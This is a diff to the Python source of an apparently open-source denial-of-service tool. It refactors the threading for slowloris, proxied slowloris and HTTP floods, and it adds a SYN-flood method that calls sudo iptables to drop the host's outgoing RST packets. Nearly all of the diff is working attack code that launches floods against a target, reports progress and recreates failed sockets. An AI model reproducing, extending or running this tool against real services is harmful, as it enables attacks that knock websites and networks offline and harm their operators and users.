@@ -2,16 +2,17 @@
 
 from __future__ import annotations
 
+import os
 import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Callable, Dict, List, Tuple, Union
+from typing import Callable, Dict, Iterator, List, Tuple, Union
 
-from colorama import Fore
+from colorama import Fore as F
 from humanfriendly import Spinner, format_timespan
 
-from tools.addons.ip_tools import get_target_address
+from tools.addons.ip_tools import get_host_ip, get_target_address
 from tools.addons.sockets import create_socket, create_socket_proxy
 
 
@@ -26,7 +27,14 @@ def get_method_by_name(method: str) -> Callable:
     """
     if method in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
         layer_number = 7
-    elif method in ["tcp"]:
+    elif method in ["syn-flood"]:
+        rule = os.popen(
+            f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+        ).read()
+        if rule == "":
+            os.system(
+                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+            )
         layer_number = 4
     directory = f"tools.L{layer_number}.{method}"
     module = __import__(directory, fromlist=["object"])
@@ -79,64 +87,50 @@ class AttackMethod:
             sleep(1)
         self.is_running = False
 
+    def __slow_flood(
+        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
+    ) -> None:
+        """Run slowloris and slowloris-proxy attack methods."""
+        if "proxy" in self.method_name:
+            try:
+                self.method(args[0], args[1])
+            except (ConnectionResetError, BrokenPipeError):
+                sock, proxy = create_socket_proxy(self.target)
+                self.thread = Thread(target=self.__run_flood, args=(sock, proxy))
+                self.thread.start()
+        else:
+            self.method(args[0])
+        sleep(self.sleep_time)
+
     def __run_flood(
         self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
     ) -> None:
         """Start the flooder."""
         while self.is_running:
-
-            # Slowloris flood.
             if "slowloris" in self.method_name:
-                if "proxy" in self.method_name:
-                    try:
-                        self.method(args[0], args[1])
-                    except (ConnectionResetError, BrokenPipeError):
-                        sock, proxy = create_socket_proxy(self.target)
-                        self.thread = Thread(
-                            target=self.__run_flood, args=(sock, proxy)
-                        )
-                        self.thread.start()
-                else:
-                    self.method(args[0])
-                sleep(self.sleep_time)
-
-            # Other methods flood.
+                self.__slow_flood(*args)
             else:
                 self.method(self.target)
 
-    def __run_threads(self) -> None:
-        """Initialize the threads."""
-        # Initialization of Slowloris.
-        if "slowloris" in self.method_name:
-            with Spinner(
-                label=f"{Fore.YELLOW}Creating {self.threads_count} Socket(s)...{Fore.RESET}",
-                total=100,
-            ) as spinner:
-                for index in range(self.threads_count):
-                    if "proxy" in self.method_name:
-                        sock, proxy = create_socket_proxy(
-                            self.target,
-                        )
-                        self.threads.append(
-                            Thread(target=self.__run_flood, args=(sock, proxy))
-                        )
-                    else:
-                        sock = create_socket(
-                            self.target,
-                        )
-                        self.threads.append(
-                            Thread(target=self.__run_flood, args=(sock,))
-                        )
-                    spinner.step(100 / self.threads_count * (index + 1))
-
-        # Initialization of other methods.
-        else:
-            self.threads = [
-                Thread(target=self.__run_flood) for _ in range(self.threads_count)
-            ]
-
+    def __slow_threads(self) -> Iterator[Thread]:
+        """Initialize the threads for slowloris and slowloris-proxy attacks."""
         with Spinner(
-            label=f"{Fore.YELLOW}Starting {self.threads_count} Thread(s){Fore.RESET}",
+            label=f"{F.YELLOW}Creating {self.threads_count} Socket(s)...{F.RESET}",
+            total=100,
+        ) as spinner:
+            for index in range(self.threads_count):
+                if "proxy" in self.method_name:
+                    sock, proxy = create_socket_proxy(self.target)
+                    yield Thread(target=self.__run_flood, args=(sock, proxy))
+                else:
+                    sock = create_socket(self.target)
+                    yield Thread(target=self.__run_flood, args=(sock,))
+                spinner.step(100 / self.threads_count * (index + 1))
+
+    def __start_threads(self) -> None:
+        """Start the threads."""
+        with Spinner(
+            label=f"{F.YELLOW}Starting {self.threads_count} Thread(s){F.RESET}",
             total=100,
         ) as spinner:
             for index, thread in enumerate(self.threads):
@@ -144,48 +138,55 @@ class AttackMethod:
                 self.thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
 
-        # Timer starts counting after all threads were created.
+    def __run_threads(self) -> None:
+        """Initialize the threads and start them."""
+        if "slowloris" in self.method_name:
+            self.threads = [thread for thread in self.__slow_threads()]
+        else:
+            self.threads = [
+                Thread(target=self.__run_flood) for _ in range(self.threads_count)
+            ]
+
+        self.__start_threads()
+
+        # Timer starts counting after all threads were started.
         timer = Thread(target=self.__run_timer)
         timer.start()
 
         # Close all threads after the attack is completed.
-        for index, thread in enumerate(self.threads):
+        for thread in self.threads:
             thread.join()
 
-        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
+        print(f"{F.MAGENTA}\n\n[!] {F.BLUE}Attack Completed!\n\n{F.RESET}")
 
     def start(self) -> None:
         """Start the DoS attack itself."""
-        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}\n[!] {Fore.BLUE}Attacking {Fore.MAGENTA}{target}{Fore.BLUE} using {Fore.MAGENTA}{self.method_name.upper()}{Fore.BLUE} method {Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}\n{Fore.RESET}"
+            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target.split('http://')[1]}{F.BLUE} using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
         )
         if "slowloris" in self.method_name:
             print(
-                f"{Fore.MAGENTA}[!] {Fore.BLUE}Sockets that eventually went down are automatically recreated!\n\n{Fore.RESET}"
+                f"{F.MAGENTA}[!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
             )
         elif self.method_name == "http-proxy":
             print(
-                f"{Fore.MAGENTA}[!] {Fore.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{Fore.RESET}"
+                f"{F.MAGENTA}[!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
             )
 
         self.is_running = True
 
         try:
             self.__run_threads()
-
         except KeyboardInterrupt:
             self.is_running = False
             print(
-                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping Attack...{Fore.RESET}"
+                f"{F.RED}\n\n[!] {F.MAGENTA}Ctrl+C detected. Stopping Attack...{F.RESET}"
             )
 
             for thread in self.threads:
                 if thread.is_alive():
                     thread.join()
 
-            print(
-                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
-            )
+            print(f"{F.MAGENTA}\n[!] {F.BLUE}Attack Interrupted!\n\n{F.RESET}")
             sys.exit(1)
